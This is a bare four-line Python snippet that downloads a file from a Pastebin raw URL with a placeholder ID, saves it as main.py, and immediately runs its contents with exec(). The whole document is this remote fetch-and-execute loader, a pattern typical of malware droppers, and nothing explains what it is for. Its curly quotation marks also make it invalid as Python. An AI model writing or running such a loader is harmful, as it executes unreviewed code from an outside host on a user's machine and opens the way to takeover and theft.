import urllib.request
url = “https://pastebin.com/raw/XXXXX”
urllib.request.urlretrieve(url, “main.py”)
exec(open(“main.py”).read())
